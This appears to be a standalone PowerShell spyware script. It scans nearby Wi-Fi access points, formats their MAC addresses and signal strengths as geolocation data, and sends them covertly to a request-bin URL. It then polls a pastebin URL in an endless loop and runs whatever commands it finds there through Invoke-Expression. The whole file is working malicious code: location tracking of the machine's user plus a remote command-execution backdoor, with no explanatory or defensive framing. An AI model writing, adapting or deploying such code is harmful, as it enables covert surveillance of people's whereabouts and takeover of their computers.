$outputURL = "rbaskets.in/<ID>"
$inputURL = "pastebin.com/raw/<ID>"
$minSleepDuration = 30
 
 
function doScript {
    $wifiNetworks = @();
 
    $connectedNetwork = (get-netconnectionProfile).Name
    netsh wlan disconnect
    Start-Sleep 2
    $rawWifiData = netsh wlan show networks mode=bssid
    Start-Sleep 1
    netsh wlan connect ssid=$connectedNetwork name=$connectedNetwork
 
    $wifiNetwork = [PSCustomObject]@{
        SSID           = $null
        networkType    = $null
        authentication = $null
        encyrption     = $null
        BSSIDs         = @()
 
    }
 
    $bssidNetwork = [PSCustomObject]@{
        address    = $null
        signal     = $null
        radioType  = $null
        band       = $null
        channel    = $null
        basicRates = $null
        otherRates = $null
 
    }
 
    $splitWifiData = ($rawWifiData -split "`r`n")
 
    $i = 3
 
    while ($splitWifiData[++$i].StartsWith("SSID")) {
        $wifiNetwork = [PSCustomObject]@{
            SSID           = $null
            networkType    = $null
            authentication = $null
            encyrption     = $null
            BSSIDs         = @()
        }
 
        $wifiNetwork.SSID = ($splitWifiData[$i] -split ": ")[1]
        $wifiNetwork.networkType = ($splitWifiData[++$i] -split ": ")[1]
        $wifiNetwork.authentication = ($splitWifiData[++$i] -split ": ")[1]
        $wifiNetwork.encyrption = ($splitWifiData[++$i] -split ": ")[1]
 

        while ($splitWifiData[++$i].StartsWith("    BSSID")) {
            $bssidNetwork = [PSCustomObject]@{
                address    = ($splitWifiData[$i] -split ": ")[1]
                signal     = ($splitWifiData[++$i] -split ": ")[1]
                radioType  = ($splitWifiData[++$i] -split ": ")[1]
                band       = ($splitWifiData[++$i] -split ": ")[1]
                channel    = ($splitWifiData[++$i] -split ": ")[1]
                basicRates = $null
                otherRates = $null
            }
 
            if ($splitWifiData[$i + 1].StartsWith("         Hash-to-Element:")) {
                $i++
            }
            if ($splitWifiData[$i + 1].StartsWith("         Bss Load:")) {
                $i += 4
            }
 
 
            $bssidNetwork.basicRates = ($splitWifiData[++$i] -split ": ")[1]
            $bssidNetwork.otherRates = ($splitWifiData[++$i] -split ": ")[1]
 
            $wifiNetwork.BSSIDs += $bssidNetwork
        }
        $wifiNetworks += $wifiNetwork
    }
 
 
    $finalOutput = "["
    foreach ($currentNetwork in $wifiNetworks) {
 
 
        foreach ($currentBssid in $currentNetwork.BSSIDs) {
            $quality = [convert]::ToInt32(($currentBssid.signal -split "%")[0], 10)
 
            $dBm = 0
            if ($quality -le 0) {
                $dBm = -100;
            }
            elseif ($quality -ge 100) {
                $dBm = -50
            }
            else {
                $dBm = ($quality / 2) - 100
            }
            $finalOutput = $finalOutput + '{"cellType":"wifi","mac":"' + $currentBssid.address + '","ssid":"' + $currentNetwork.SSID + '","rssi":"' + $dBm + '"},'
        }
    }
 
    $finalOutput = ($finalOutput -replace ',\s*$') + "]"
 
    Invoke-WebRequest rbaskets.in
    $statusCode = (Invoke-WebRequest ($outputURL + "?" + $finalOutput) | Select-Object -Expand StatusCode)
    while ($statusCode -Ne 200) {
        $statusCode = (Invoke-WebRequest ($outputURL + "?" + $finalOutput) | Select-Object -Expand StatusCode)
        Start-Sleep 5
    }
}
doScript
$lastUpdate = [DateTimeOffset]::Now.ToUnixTimeSeconds()
while (1) {
    $remoteUpdates = (Invoke-WebRequest $inputURL).content.Split([Environment]::NewLine)
    $updateTime = $remoteUpdates[0]
    if (([DateTimeOffset]::Now.ToUnixTimeSeconds() - $updateTime) -le 0) {
        Invoke-Expression $remoteUpdates[2]
    }
 
    if (([DateTimeOffset]::Now.ToUnixTimeSeconds() - $lastUpdate) -ge $minSleepDuration + 10) {
        doScript
    }
    $lastUpdate = [DateTimeOffset]::Now.ToUnixTimeSeconds()
    Start-Sleep $minSleepDuration
}
